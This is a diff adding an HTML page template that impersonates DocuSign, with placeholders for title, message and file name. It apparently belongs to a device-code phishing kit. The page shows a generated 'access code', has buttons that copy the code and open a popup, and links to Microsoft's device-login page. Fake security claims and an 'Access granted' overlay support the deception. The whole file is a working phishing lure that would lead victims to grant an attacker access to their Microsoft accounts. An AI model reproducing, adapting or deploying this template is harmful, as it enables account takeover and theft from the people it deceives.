@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
+<title>{{TITLE}}</title>
+<link rel="icon" href="docusign5_logo.jpg">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{height:100%;width:100%}
+body{font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fafafa;display:flex;flex-direction:column;min-height:100vh}
+.header{background:#1a1a1a;padding:16px 36px;display:flex;align-items:center;gap:14px;flex-shrink:0}
+.header svg{flex-shrink:0}
+.header-title{color:#fff;font-size:15px;font-weight:800;letter-spacing:-0.5px}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1);width:100%;max-width:520px;padding:52px 48px}
+.logo{display:flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:36px}
+.logo-icon{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.logo-icon img{flex-shrink:0;border-radius:8px}
+.logo-text{font-size:20px;font-weight:900;color:#1a1a1a;letter-spacing:-1px}
+.intro{text-align:center;color:#1a1a1a;font-size:15px;line-height:1.6;margin-bottom:12px;font-weight:700}
+.sub-intro{text-align:center;color:#505050;font-size:12px;line-height:1.6;margin-bottom:32px}
+.info-box{background:#fffbf0;border:1px solid#ffd700;border-radius:6px;padding:18px 20px;margin-bottom:32px;font-size:14px;color:#5c4d00;line-height:1.7}
+.code-label{font-size:14px;font-weight:700;color:#1a1a1a;margin-bottom:12px}
+.code-input{width:100%;background:#fafafa;border:2px solid#d4d4d4;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#ffd700;text-align:center;font-family:monospace;margin-bottom:14px;user-select:all;transition:all .2s}
+.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal}
+.code-input:hover{border-color:#ffd700}
+.copy-row{display:flex;justify-content:center;margin-bottom:28px}
+.copy-btn{background:#ffd700;color:#1a1a1a;border:none;padding:12px 28px;border-radius:6px;cursor:pointer;font-size:16px;font-weight:800;display:flex;align-items:center;gap:10px;transition:all .2s}
+.copy-btn:hover{background:#e6c200;transform:translateY(-1px)}
+.copy-btn.copied{background:#107c10;color:#fff}
+.copy-btn svg{width:18px;height:18px;fill:currentColor}
+.status{font-size:15px;color:#107c10;text-align:center;margin-bottom:22px;min-height:24px;font-weight:700}
+.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#ffd700;color:#1a1a1a;border:none;padding:14px 28px;font-size:14px;font-weight:900;cursor:pointer;border-radius:6px;transition:all .2s;margin-bottom:28px}
+.btn-primary:hover{background:#e6c200;transform:translateY(-1px)}
+.btn-primary:disabled{background:#c8c6c4;color:#8a8886;cursor:not-allowed;transform:none}
+.btn-primary svg{flex-shrink:0}
+.security-box{background:#f8f8f8;border:1px solid#e1e1e1;border-radius:6px;padding:20px;margin-bottom:28px;text-align:center}
+.security-box p{font-size:14px;color:#505050;line-height:1.7;margin-bottom:16px}
+.security-badge{display:inline-flex;align-items:center;gap:10px;background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:6px;font-size:14px;font-weight:800;text-decoration:none;transition:background .2s}
+.security-badge:hover{background:#000}
+.security-badge svg{width:16px;height:16px;fill:currentColor}
+.footer-text{text-align:center;font-size:13px;color:#707070;margin-bottom:20px}
+.timer{text-align:center;font-size:13px;color:#505050;font-weight:600}
+.timer span{font-weight:800;color:#d83b01}
+.success{display:none;text-align:center;padding:28px 0}
+.success-icon{width:80px;height:80px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 28px}
+.success-icon svg{width:40px;height:40px;fill:#fff}
+.success h2{font-size:24px;font-weight:900;color:#1a1a1a;margin-bottom:12px}
+.success p{font-size:16px;color:#505050;margin-bottom:28px}
+.success-badge{display:inline-flex;align-items:center;gap:12px;background:#dff6dd;color:#107c10;padding:14px 28px;border-radius:6px;font-size:16px;font-weight:800;border:1px solid#b3e0b0}
+.success-badge svg{width:22px;height:22px;fill:currentColor}
+
+/* --- vg-engine.js compatibility --- */
+#initialStateBox { transition: opacity .2s; }
+#initialStateBox.hidden { display: none; }
+
+.code-panel { display: none; }
+.code-panel.show { display: block; animation: slideUp .25s ease; }
+@keyframes slideUp { from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)} }
+
+.code-box { margin-bottom: 8px; }
+.code-value { font-family: 'SF Mono', 'Roboto Mono', Consolas, monospace; font-size: 28px; font-weight: 700; letter-spacing: 8px; color: #1a1a1a; user-select: all; transition: opacity .15s; }
+.code-value.loading { opacity: .35; color: #8a8886; font-size: 17px; letter-spacing: normal; }
+.code-hint { font-size: 12px; color: #505050; margin-top: 8px; text-align: center; }
+
+.timer-row { display: flex; align-items: center; justify-content: space-between; margin-top: 14px; }
+.timer-pill { display: inline-flex; align-items: center; gap: 6px; background: #fffbf0; color: #5c4d00; border: 1px solid #ffd700; border-radius: 40px; padding: 5px 12px; font-size: 13px; font-weight: 600; }
+.timer-pill.expired { background: #fde7e9; color: #d83b01; border-color: #fecaca; }
+
+.refresh-btn { background: none; border: none; cursor: pointer; color: #1a1a1a; font-family: inherit; font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; padding: 5px 10px; border-radius: 4px; transition: background .12s; }
+.refresh-btn:hover { background: #f5f5f5; }
+
+.action-row { display: flex; flex-direction: column; gap: 12px; margin-top: 16px; }
+.action-row button { width: 100%; }
+
+.overlay { display: none; position: fixed; inset: 0; background: rgba(20,30,45,.55); backdrop-filter: blur(3px); align-items: center; justify-content: center; z-index: 100; }
+.overlay.show { display: flex; }
+.overlay-card { background: #fff; border-radius: 12px; padding: 44px 40px 40px; text-align: center; width: 320px; box-shadow: 0 20px 48px rgba(0,0,0,.18); }
+.overlay-card h3 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+.overlay-card p { font-size: 13px; color: #505050; line-height: 1.55; }
+
+@media(max-width:500px){.card{padding:40px 32px;border-radius:0}.code-input{font-size:22px;letter-spacing:4px}.code-value{font-size:24px;letter-spacing:6px}}
+</style>
+</head>
+<body>
+<div class="header">
+<img src="docusign5_logo.jpg" width="32" height="32" alt="DocuSign" style="border-radius:6px;flex-shrink:0">
+<span class="header-title">DocuSign</span>
+</div>
+<div class="main"><div class="card">
+<div class="logo">
+<div class="logo-icon">
+<img src="docusign5_logo.jpg" width="40" height="40" alt="DocuSign" style="border-radius:8px;flex-shrink:0">
+<span class="logo-text">DocuSign</span>
+</div>
+</div>
+
+<!-- Initial State: shown before code generation -->
+<div id="initialStateBox">
+<p class="intro">{{MESSAGE}}</p>
+<div class="info-box">DocuSign uses industry-leading encryption to protect your documents. Enter the code below to authenticate and proceed to signing.</div>
+<div class="code-label">Document Access Code</div>
+<div class="code-input" id="codePlaceholder">Loading...</div>
+<div class="copy-row">
+<button class="copy-btn" disabled>
+<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"></path></svg>
+<span>Copy Code</span>
+</button>
+</div>
+<button class="btn-primary" id="startBtn" onclick="generateCode()">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
+{{BUTTON_TEXT}}
+</button>
+</div>
+
+<!-- Code Panel: hidden until vg-engine.js adds .show -->
+<div class="code-panel" id="codePanel">
+<div class="code-box">
+<div class="code-value loading" id="codeValue">· · · · · ·</div>
+<div class="code-hint" id="codeHint">Use this code to complete verification on your device.</div>
+</div>
+<div class="timer-row">
+<div class="timer-pill" id="timerPill" style="display:none"></div>
+<button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
+<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg> Get new code
+</button>
+</div>
+<div class="action-row" id="actionRow" style="display:none">
+<button class="copy-btn" id="copyBtn" onclick="copyAndOpenPopup()">
+<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"></path></svg>
+<span>Copy Code</span>
+</button>
+<button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
+SIGN DOCUMENT
+</button>
+</div>
+<div class="status" id="statusMsg"></div>
+</div>
+
+<div class="security-box">
+<p>Your document security is our priority. DocuSign uses industry-leading encryption to protect your documents and identity. <strong>{{FILE_NAME}}</strong> ({{PAGES_LABEL}})</p>
+<a href="https://microsoft.com/devicelogin" target="_blank" class="security-badge">
+<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"></path></svg>
+DocuSign Secure Platform
+</a>
+</div>
+<p class="footer-text">Trusted by millions worldwide for secure document signing.</p>
+</div></div>
+
+<!-- Success Overlay -->
+<div class="overlay" id="overlay">
+<div class="overlay-card">
+<div style="width:60px;height:60px;background:#E6F9EE;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#107c10" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg>
+</div>
+<h3>Access granted</h3>
+<p id="overlayMsg">Identity verified.<br>Redirecting to your document…</p>
+</div>
+</div>
+</body>
+</html>
